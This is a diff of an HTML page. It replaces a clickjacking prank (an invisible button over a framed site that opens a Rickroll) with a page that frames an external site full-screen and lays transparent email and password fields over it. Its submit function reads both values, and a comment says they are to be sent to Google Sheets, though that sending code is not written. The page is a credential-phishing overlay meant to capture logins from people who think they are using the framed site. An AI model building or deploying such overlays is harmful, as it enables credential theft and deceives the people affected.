@@ -1,44 +1,111 @@
-<style>
-	iframe{
-		position: relative;
-	    top: 0px;
-	    bottom: 0px;
-	    right: 0px;
-	    width: 100%;
-	    border: none;
-	    margin: 0;
-	    padding: 0;
-	    overflow: hidden;
-	    overflow-y: hidden;
-	    z-index: 0;
-	    height: 100%;
-	    opacity: .99;
-	    display: block;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sheet Form</title>
+    <style>
+        .iframe-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+        }
 
-	}
-</style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            overflow-y: hidden;
+            z-index: 0;
+            opacity: 0.99;
+            display: block;
+        }
 
-<style>
-button {
-  background-color: transparent;
-  border: 0px solid #000;
-  width: 1000px;
-  height: 70px;
-  opacity: 0.5; /* Make the button 50% transparent */
-  position: absolute;
-  top: 500px;
-  left: 0px;
-  z-index: 1;
-  transition: all 0.5s;
-}
+        .form-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: transparent;
+            padding: 20px;
+            border: transparent;
+            border-radius: 5px;
+            z-index: 1;
+        }
 
-button:hover {
-	cursor: pointer;
+        .form-group {
+            margin-bottom: 15px;
+        }
 
-}
-</style>
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
 
-<button onclick="window.open('https://youtu.be/dQw4w9WgXcQ?t=1')">
-</button>
+        .form-group input[type="text"] {
+            width: 2965%;
+            padding: 8px;
+            margin-bottom: 30px;
+            font-size: 16px;
+            border: 2px solid #ccc;
+            background-color: white;
+            border-radius: 4px;
+            top: -40px;
+            left: -655px;
+            position: relative;
+        }
 
-<iframe src="https://bcminvestmentsales.azurewebsites.net/"></iframe>
+        .form-group button {
+            background-color: transparent;
+            border: 0;
+            width: 640px;
+            height: 60px;
+            opacity: 0.5;
+            position: absolute;
+            top: 125px;
+            left: -655px;
+            z-index: 1;
+            transition: all 0.5s;
+            cursor: pointer;
+        }
+
+        .form-group button:hover {
+            opacity: 1; /* Change opacity on hover */
+        }
+
+    </style>
+</head>
+<body>
+    <div class="iframe-container">
+        <iframe src="https://bcminvestmentsales.azurewebsites.net/" scrolling="no"></iframe>
+        <div class="form-container">
+            <div class="form-container">
+                <div class="form-group">
+                    <input type="text" id="textbox1" name="textbox1" placeholder="Email address">
+                </div>
+                <div class="form-group">
+                    <input type="text" id="textbox2" name="textbox2" placeholder="Password">
+                </div>
+                <div class="form-group">
+                <button type="button" onclick="submitForm()"></button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function submitForm() {
+            var textbox1Value = document.getElementById("textbox1").value;
+            var textbox2Value = document.getElementById("textbox2").value;
+            
+            // Handle form submission logic here, e.g., send data to Google Sheets.
+        }
+    </script>
+</body>
+</html>
